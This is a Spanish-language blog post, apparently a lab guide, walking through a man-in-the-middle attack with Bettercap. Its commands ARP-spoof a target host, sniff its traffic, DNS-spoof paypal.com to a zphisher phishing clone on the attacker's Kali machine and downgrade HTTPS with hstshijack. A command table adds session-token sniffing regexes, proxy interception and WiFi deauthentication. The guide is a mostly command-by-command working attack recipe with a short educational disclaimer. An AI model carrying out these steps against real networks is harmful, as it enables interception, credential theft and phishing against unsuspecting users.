---
title: Man in The Middle Attack
date: 2025-01-27 12:00:00 -0500
categories: [Laboratorios, MiTM
tags: [Bettercap, MiTM, ARP spoofing, DNS spoofing, Net sniffing, HTTPS downgrade, Proxy, WiFi, Bluetooth]
image:
  path: /assets/img/posts/mitm-bettercap/cabecera.png
  alt: bettercap
description: >
  Guía de como llevar a cabo un ataque MiTM con Bettercap
pin: false  
toc: true   
math: false 
mermaid: false 
---

## ¿Qué es un MiTM?

Un ataque de intermediario (**MITM** por sus siglas en inglés "Man-in-the-middle") es un ataque donde el atacante secretamente retransmite y posiblemente altera las comunicaciones entre dos dispositivos que creen estar comunicándose directamente entre sí. Para realizar un ataque de intermediario, necesitamos estar en la misma red que nuestra víctima ya que tenemos que engañar a estos dos dispositivos.

Por ejemplo:

1. Imagina que el Dispositivo A quiere comunicarse con el Dispositivo B (puede ser tu computadora tratando de acceder a un sitio web)

2. El atacante se posiciona en medio y:
   - Intercepta los mensajes que envía A hacia B
   - Puede leer toda la información que pasa
   - Puede modificar los mensajes antes de pasarlos
   - Tanto A como B piensan que están hablando directamente entre sí

3. ¿Por qué es peligroso?
   - El atacante puede robar información sensible (contraseñas, datos bancarios)
   - Puede modificar la información que se transmite
   - Puede suplantar la identidad de cualquiera de los dos dispositivos

4. ¿Cómo se realiza técnicamente?
   - El atacante debe estar en la misma red que la víctima
   - Usa herramientas como bettercap para:
     - Interceptar el tráfico de red
     - Redirigir la comunicación a través de su dispositivo
     - Analizar los paquetes de datos que pasan

5. Medidas de protección:
   - Usar conexiones cifradas (HTTPS)
   - No conectarse a redes WiFi públicas o no confiables
   - Utilizar una VPN
   - Mantener actualizados los sistemas y software

## Iniciando Bettercap

### Selección de interfaz de red

Necesitamos seleccionar la interfaz que se encuentre conectada a la misma red que nuestro objetivo.

```bash
ip a
```

Cuando sepamos la interfaz iniciaremos bettercap.

```bash
bettercap --iface eth0
```
![betterini](/assets/img/posts/mitm-bettercap/bettercap_ini.png)

### Ayuda

Para poder ver los servicios de bettercap que estan activos en este momento.
Ahora mismo solo encontraremos el visor de eventos.

![betterhelp](/assets/img/posts/mitm-bettercap/bettercap_help.png)

### Escaneando la red

```bash
net.probe on
```

Mediante este comando vamos a realizar un escaneo de hosts dentro de la red.
Este escaneo incluye IPs, MACs e incluso nombre del fabricante (vendor names).

![netprobe](/assets/img/posts/mitm-bettercap/netprobe.png)

En este caso nos vamos a centrar en esta dirección que nos indica al parecer que se trata de una maquina gestionada por Proxmox (que es nuestro caso).

Tambén podemos mostrar en forma de tabla todos los dispositivos identificados en la red.

```bash
net.show
```
![netshow](/assets/img/posts/mitm-bettercap/netshow.png)

> **Nota**: Aqui podemos ver el gateway de la red (router) y los dispositivos listados en orden ascendente
{: .prompt-info }


### ARP Spofing

#### ¿De que se trata?

1. En una red normal, ARP relaciona direcciones IP con direcciones MAC (físicas)
El atacante envía mensajes ARP falsos diciendo:

- "Yo soy el router" (al dispositivo víctima)
- "Yo soy el dispositivo" (al router)

2. Esto hace que:

La víctima envíe todo su tráfico al atacante pensando que es el router
El router envíe sus respuestas al atacante pensando que es la víctima

3. Como resultado:

Todo el tráfico pasa por el atacante
El atacante puede ver y modificar la información
Ni la víctima ni el router se dan cuenta

#### Configurando el ARP spoofing

Una vez localizado nuestro objetivo en la red es momento de envenear su ARP cache y la del gateway de la red.

Para esto vamos a utilizar el siguiente comando

```bash
arp.spoof help
```

![arpspoofhelp](/assets/img/posts/mitm-bettercap/arphelp.png)

Como indica la ayuda en este caso necesitamos indicar el modo fullduplex.

```bash
set arp.spoof.fullduplex true
```

Ahora le vamos a indicar la ip del objetivo 

```bash
set arp.spoof.targets 192.168.100.222
```

#### Iniciando el ARP Spoofing

```bash
arp.spoof on
```

### Net sniffing

Una vez estamos envenenando las ARP caches de ambos gatway y objetivo ahora podemos visualizar todas las comunicaciones entre los dispositivos ya que estas serán redirigidas a través de nuestra máquina.

En este punto tenemos dos opciones:

1. Usar los datos del sniffer incorporado en bettercap
2. Utilizar otros como Wireshark o TCPDump

Sea cual sea la elección primero hay que indicar a bettercap que haga una captura de todo el tráfico.

```bash
net.sniff on
```
Una vez hecho podremos ver las peticiones realizadas por el objetivo.

Si además capturamos con algun software como wireshark podremos tener con más detalle todo el tráfico de datos entre ambos puntos.


![netsniffon](/assets/img/posts/mitm-bettercap/netsniff.png)

En esta captura podemos ver marcados en rojo los diferentes tipos de datos en los que se diferencian los enviados desde el cliente al servidor y los recibidos por el cliente desde el servidor.

Los indicados como "sniff" son los datos que se envían desde el cliente al servidor, mientras que los indicados como "dns" son las respuestas que el servidor envía al cliente.
En estos últimos podemos ver como va resolviendo las peticiones y se indican las IPs de los servidores DNS que se utilizan.

En los datos proporcionados por bettercap se observa todo el tráfico de datos en transito entre el cliente y el servidor por lo que filtrar puede ser bastante difícil, es por eso que se aconseja utilizar otros sniffers como wireshark para poder capturar, filtrar y analizar el tráfico de datos.

## DNS spoofing

Es una técnica donde se manipulan las respuestas DNS para redirigir el tráfico.
- Proceso normal de DNS:

  - Un usuario escribe www.ejemplo.com
  - Su dispositivo pregunta al servidor DNS "¿Cuál es la IP de www.ejemplo.com?"
  - El servidor DNS responde con la IP correcta

- Durante DNS Spoofing:

  - El atacante intercepta la consulta DNS
  - Envía una respuesta falsa antes que el servidor DNS real
  - Asocia el dominio con una IP maliciosa
  - El usuario es redirigido a un sitio falso

Para este proceso realizaremos lo siguiente:
1. Crear un portal falso servido desde nuestra máquina linux
2. Seleccionar el dominio real que será reemplazado por el malicioso
3. Comenzar el envenenamiento de DNS hacia el objetivo

### Seleccionar dominio y redirección

```bash
set dns.spoof.domains paypal.com
set dns.spoof.address 192.168.100.210
```
En este caso estamos seleccionando el dominio paypal.com y la redirección a la IP de mi máquina kali.

Como estoy haciendo uso de un servicio que solo puedo ver de forma local en mi kali (zphisher), vamos a redireccionar el tráfico del puerto 8080 local al 80 en mi interfaz compartida con la maquina objetivo

> **Nota**: Tambien cuenta con el comando dns.spoof.ttl para configurar el tiempo de vida que la dns queda guardada en cache, a menor valor más rápido se va a recargar.
{: .prompt-info }

```bash
# Redirige de tu IP:puerto a localhost:puerto
socat TCP-LISTEN:80,bind=192.168.100.210,fork TCP:127.0.0.1:8080
```
Ahora que tenemos listo el portal falso podemos iniciar el DNS Spoofing.

> **Consejo**: Si como en este caso el servicio es servido de forma local es importante saber que nuestra máquina kali también debe reconocer el dominio paypal.com como 192.168.100.210 por lo que debemos añadir esta indicación en el archivo /etc/hosts
{: .prompt-tip }

### Iniciar el DNS Spoofing

```bash
dns.spoof on
```
Si todo ha sido configurado correctamente al intentar acceder a 192.168.100.40 desde el objetivo vamos a tener un error de conexión.

![dnspoof](/assets/img/posts/mitm-bettercap/dnserror.png)

Esto se debe a que los navegadores modernos obligan a que los usuarios tengan una conexión segura a través de HTTPS, pero esto no es problema ya que podemos obligar a que la conexión sea HTTP.

#### Configurar HTTPS downgrade

1. Activamos el modulo en bettercap

```bash
hstshijack/hstshijack on
```

![hstshijack](/assets/img/posts/mitm-bettercap/hstshijack.png)

2. Configuramos el dominio a interceptar

```bash
set hstshijack.targets paypal.com
```

3. Forzamos el downgrade a Http

```bash
set hstshijack.replacements 192.168.100.210:443,192.168.100.210:80
```
Con esto listo deberiamos tener acceso al clon de paypal desde nuestro objetivo.

### Revisando el tráfico

![portalfalso](/assets/img/posts/mitm-bettercap/portalpaypal.png)

![dnsspoof](/assets/img/posts/mitm-bettercap/capturaspoofdns.png)

Como vemos aquí el objetivo ha sido redirigido a nuestra máquina kali y hemos podido realizar un ataque de phishing.

![Zphisher](/assets/img/posts/mitm-bettercap/zphisher.png)


## Lista de comandos

Bettercap tiene una gran cantidad de comandos que pueden ser utilizados para realizar diversos ataques.

### ARP Spoofing

| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `arp.spoof` | Envía ARP falsos | arp.spoof on |
| `set dns.spoof.domains` | Configura el dominio a interceptar | set dns.spoof.domains paypal.com |
| `set dns.spoof.address` | Configura la IP del objetivo | set dns.spoof.address 192.168.100.210 |
| `set arp.spoof.ipv6` | Configura la IPv6 para el ARP spoofing | set arp.spoof.ipv6 on |


### DNS Spoofing

| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `dns.spoof` | Envía respuestas falsas a las consultas DNS | dns.spoof on |
| `set dns.spoof.domains` | Configura el dominio a interceptar | set dns.spoof.domains paypal.com |
| `set dns.spoof.address` | Configura la IP del objetivo | set dns.spoof.address 192.168.100.210 |
| `set dns.spoof.ttl` | Configura el tiempo de vida de la cache | set dns.spoof.ttl 10 |

### Net sniffing

| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `net.sniff` | Captura todos los tráfico de red | net.sniff on |
| `net.show` | Muestra información sobre la red | net.show |
| `net.probe` | Proba la conectividad de la red | net.probe on |
| `set net.sniff.regexp` | Configura la expresión regular para capturar el tráfico | set net.sniff.regexp (session=|sessid=|token=|PHPSESSID=)([^\s]*)' |
| `set net.sniff.filter tcp port`  | Configura el filtro para capturar el tráfico | set net.sniff.filter tcp port 80 |
| `set net.sniff.output captura.pcap` | Configura el archivo de salida para guardar el tráfico capturado | set net.sniff.output captura.pcap |
| `set net.sniff.nbns` | Activa el sniffing de NetBIOS | set net.sniff.nbns true |
| `set net.probe.nbns` | Activa el reconocimiento de NetBIOS | set net.probe.nbns true |

- Tráfico NetBIOS que incluye:

  - Resolución de nombres de equipos Windows
  - Compartición de archivos
  - Servicios de impresión

### HTTPS Hijacking

| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `hstshijack` | Para hacer un downgrade de HTTPS a HTTP | hstshijack on |
| `set hstshijack.targets` | Configura el dominio a interceptar | set hstshijack.targets paypal.com |
| `set hstshijack.replacements` | Configura la redirección a la IP del objetivo | set hstshijack.replacements 192.168.100.210:443,192.168.100.210:80 |

### Proxy Http/Https

| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `set http.proxy.port` | Configura el puerto del proxy | set http.proxy.port 8080 |
| `set http.proxy.address` | Configura la IP del proxy | set http.proxy.address 192.168.100.210 |
| `set http.proxy.type` | Configura el tipo de proxy | set http.proxy.type http |
| `set https.proxy.port` | Configura el puerto del proxy | set https.proxy.port 8083 |
| `set https.proxy.address` | Configura la IP del proxy | set https.proxy.address 192.168.100.210 |
| `set https.proxy.type` | Configura el tipo de proxy | set https.proxy.type https |
| `set http.proxy.script` | Configura un script para la redirección | set http.proxy.script /ruta/al/script.js |


- Intercepta específicamente tráfico HTTP/HTTPS
- Permite ver y modificar peticiones web
- Útil para:

  - Analizar tráfico web
  - Modificar contenido de páginas
  - Interceptar credenciales web

### Proxy TCP

| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `set tcp.proxy.port` | Configura el puerto del proxy | set tcp.proxy.port 443 |
| `set tcp.proxy.address` | Configura la IP del proxy | set tcp.proxy.address 192.168.100.210 |
| `tcp.proxy on` | Activa el proxy TCP | tcp.proxy on |

- Intercepta cualquier tráfico TCP
- Más general que HTTP proxy
- Útil para:

  - Interceptar tráfico de cualquier protocolo TCP
  - Redirigir conexiones
  - Bloquear DoH (DNS over HTTPS)

### WiFi

| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
| `wifi.recon on` | Activa el WiFi reconocimiento | wifi.recon on |
| `wifi.recon.channel` | Configura el canal WiFi | wifi.recon.channel 11 |
| `wifi.show` | Muestra la configuración WiFi actual | wifi.show |
| `wifi.deauth` | Envía una petición de desautenticación WiFi | wifi.deauth on |

### Bluetooth

| Comando | Descripción | Ejemplo |
|---------|-------------|---------|
|`ble.recon on` | Activa el reconocimiento de dispositivos Bluetooth | ble.recon on |
|`ble.show` | Muestra la configuración Bluetooth actual | ble.show | 
|`ble.enum MAC_ADDRESS` | Enumera los servicios y características de un dispositivo Bluetooth | ble.enum 00:11:22:33:44:55 |


> **Advertencia**: El contenido de esta sección es meramente informatio y con fines educativos. No se debe utilizar para realizar ataques de manera maliciosa. No me responsabilizo del mal uso de este contenido.
{: .prompt-warning }
